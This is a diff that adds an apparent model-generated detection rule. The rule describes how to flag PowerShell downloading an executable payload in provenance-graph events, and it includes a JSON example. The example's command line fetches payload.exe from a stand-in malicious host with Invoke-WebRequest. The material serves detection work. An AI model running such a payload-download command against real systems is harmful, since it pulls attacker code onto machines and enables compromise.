@@ -1,0 +1,23 @@
+<output>
+1. **Identify Payload Download via PowerShell**  
+   - Monitor for events where the `srcNode` is a PowerShell process (e.g., `powershell.exe`).  
+   - Set the `dstNode` to reflect the destination file being downloaded, which should be an executable (e.g., `C:\\Users\\User\\Downloads\\payload.exe`).  
+   - Ensure the `relation` is set to "Process Create" for the PowerShell process.  
+   - Validate that the `Cmdline` of the `srcNode` contains the PowerShell command `Invoke-WebRequest` with a `-Uri` parameter pointing to a suspicious URL (e.g., `http://malicious.com/payload.exe`).  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
+         "Cmdline": "",
+         "Type": "File"
+       },
+       "relation": "Process Create"
+     }
+     ```
+</output>
